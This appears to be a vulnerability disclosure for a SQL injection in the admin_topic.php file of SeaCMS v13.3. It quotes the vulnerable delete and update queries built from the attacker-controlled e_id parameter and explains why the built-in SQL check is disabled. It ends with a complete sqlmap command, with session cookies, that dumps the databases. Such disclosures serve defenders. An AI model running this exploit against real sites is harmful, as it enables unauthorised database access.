sql injection vulnerability exists in admin_topic.php file in seacms v13.3 background.

download address：https://www.seacms.com/download/

![image-20250409144736693](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504091447101.png)

Code Audit

 Follow up to admin_topic.php file. 

The vulnerability occurs

```
$dsql->ExecuteNoneQuery("delete from `sea_topic` where id in ($ids)");
$dsql->ExecuteNoneQuery("update `sea_data` set v_topic=0 where v_topic in ($ids)");
```

$ids = implode (',',$e_id); $ids is controlled by $e_id, where $e_id is  controllable, and this sql statement can be executed when action=delall.

![image-20250409151448685](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504091514784.png)

It will have a sql statement check here。

![image-20250409152049662](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504091520802.png)

![image-20250409152221426](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504091522574.png)

true on initialization, checked by default, but config.php is included in the admin_topic.php file

![image-20250409152312363](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504091523511.png)

![image-20250409152347442](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504091523597.png)

config.php is set to flase, so this sql statement check fails.

sqlmap Run it:

```
python sqlmap.py -u "http://seacms.com:8888/2knum/admin_topic.php?action=delall&e_id[]=1111" -p "e_id[]" --cookie "t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D; PHPSESSID=0c3k9fd0tah3h4i93v6g63dur6" --dbs
```

![image-20250409152514869](https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202504091525099.png)